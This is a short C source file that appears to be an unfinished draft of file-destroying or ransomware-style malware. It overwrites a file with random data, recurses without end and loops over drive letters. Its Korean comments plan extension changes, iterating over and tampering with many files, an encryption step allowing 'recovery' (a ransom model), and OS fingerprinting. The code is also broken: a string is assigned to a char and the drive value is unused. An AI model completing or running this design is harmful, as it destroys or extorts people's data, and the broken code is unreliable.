#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int     disk_recon(char drive)
{
	int i;
	FILE* fs;
	char file_list = "srcs/oss.png";

	if ((fs = fopen(file_list, "w")) != NULL)
	{	//확장자바꾸기
		//파일명을 저장한다음 불러오기
		//스트링으로 받아와서 순회하게 만들기
		//함수추가해서 파일번갈아가며 변조하게 만들기
		fprintf(fs, "%d\n", rand());
		//복구가 가능하도록 암호함수로 바꾸기
	}
	else
		return (0);
        return (disk_recon(drive));
}

int     main(int argc, char *argv[])
{
    char drive;
    //OS공급자 식별함수 넣기
    drive = 'Z';
    while (drive != 'E')
    {
        if (disk_recon(drive) == 1)
            ;
	drive--;
    }
    return(0);
}
